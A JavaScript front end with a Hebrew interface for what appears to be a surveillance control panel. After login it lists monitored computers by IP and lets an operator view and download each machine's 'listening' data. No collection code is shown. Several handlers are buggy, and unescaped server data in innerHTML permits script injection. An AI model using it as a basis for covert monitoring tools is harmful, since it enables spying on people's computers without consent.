const API_URL = 'https://localhost:5000/api';

let computers = [];
document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const dashboardPage = document.getElementById('dashboard-page');
    const user = document.getElementById('user-name');
    const deshboardContent = document.getElementById('dashboard-content');
    const search = document.getElementById('search');
    const computersTable = document.getElementById('computers-list');   


    loginForm.addEventListener('submit',async (event) => {
        event.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
    
    try {
        const response = await fetch(`${API_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username,
                password
            })
        });
        const data = await response.json();
        if (data.success) {
            localStorage.setItem('username', data.username);
            dashboardPage.style.display = 'block';
            loginForm.style.display = 'none';
            user.innerText = data.username;
            updateComputersList();
        } else{
            alert("שם משתמש או סיסמה שגויים");
        }
    } catch (error) {
        console.error("שגיאת התחברות",error);
        alert("שגיאת התחברות");
    }
});


if (search) {
    search.addEventListener('input', searchComputers);
    }
});



async function addComputer() {
    const name = document.getElementById('name').value;
    const ip = document.getElementById('ip').value;
    
    const response = await fetch(`${API_URL}/computers`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            name,
            ip
        })
    });

    const data = await response.json();
    if (data.success === false) {
        alert(data.massge);
        return;
    }
    

    updateComputersList();

    document.getElementById('name').value = '';
    document.getElementById('ip').value = '';

}





async function removeComputer(ip) {
    const response = await fetch(`${API_URL}/computers/${ip}`, {
        method: 'DELETE'
    });

    await response.json();
    updateComputersList();
}


async function updateComputersList() {
    const response = await fetch(`${API_URL}/computers`);
    computers = await response.json();

    const tableBody = document.getElementById('computers-list');
    tableBody.innerHTML = '';


    computers.forEach(computer => {

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status}</td>
            <td>${computer.lastActivity}</td>
            <td>
                <button onclick="removeComputer(${computer.ip})">מחק</button>
                <button onclick="showMonitoring(${computer.ip})">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}


async function showMonitoring(ip) {

    const response = await fetch(`${API_URL}/computers/${ip}`);
    const computer = await response.json();
    
    // עדכון התוכן של לוח המחוונים
    const dashboardContent = document.getElementById('dashboard-content');
    dashboardContent.innerHTML = `
        <div class="computer-details">
            <h2>פרטי מחשב: ${computer.name}</h2>
            <div class="details-container">
                <p><strong>IP:</strong> ${computer.ip}</p>
                <p><strong>סטטוס:</strong></p>
                <p><strong>פעילות אחרונה:</strong> ${computer.lastActivity}</p>
                <p><strong>נתוני האזנה:</strong> ${computer.data ? 'זמינים' : 'לא זמינים'}</p>
                ${computer.data ? `<p><strong>עדכון אחרון:</strong> ${computer.last_modified}</p>` : ''}
            </div>
            
            <div class="actions-container">
                <button onclick="updateComputersList()">חזרה לרשימה</button>
                ${computer.data ? 
                    `<button onclick="showListeningData('${computer.ip}')">צפה בנתוני האזנה</button>
                     <button onclick="downloadListeningData('${computer.ip}')">הורד קובץ האזנה</button>` : 
                    ''}
            </div>
        </div>
    `;
} 

async function showListeningData(ip) {
    const response = await fetch(`${API_URL}/listening/${ip}`);
    const data = await response.json();

    const computer = computers.find(computer => computer.ip === ip);
    const computerName = computer.name;


    const dashboardContent = document.getElementById('dashboard-content');

    let contentHTML = '<ul>';
    for (const item of data) {
        contentHTML += `<li>${JSON.stringify(item)}</li>`;
    }
    contentHTML += '</ul>';

    dashboardContent.innerHTML = `
        <div class="listening-data">
            <h2>נתוני האזנה של מחשב: ${computerName}</h2>
            <div class="data-actions">
                <button onclick="updateComputersList()">חזרה לרשימה</button>
                <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
            </div>
            <div class="data-content">
                ${contentHTML}
            </div>
        </div>
    `;
}


function searchComputers() {
    const searchValue = search.value.toLowerCase();
    const filteredComputers = computers.filter(computer =>{
        return computer.name.includes(searchValue) ||
         computer.ip.includes(searchValue);
});

    const tableBody = document.getElementById('computers-list');
    tableBody.innerHTML = '';

    filteredComputers.forEach(computer => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status}</td>
            <td>${computer.lastActivity}</td>
            <td>
                <button onclick="removeComputer(${computer.ip})">מחק</button>
                <button onclick="showMonitoring(${computer.ip})">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}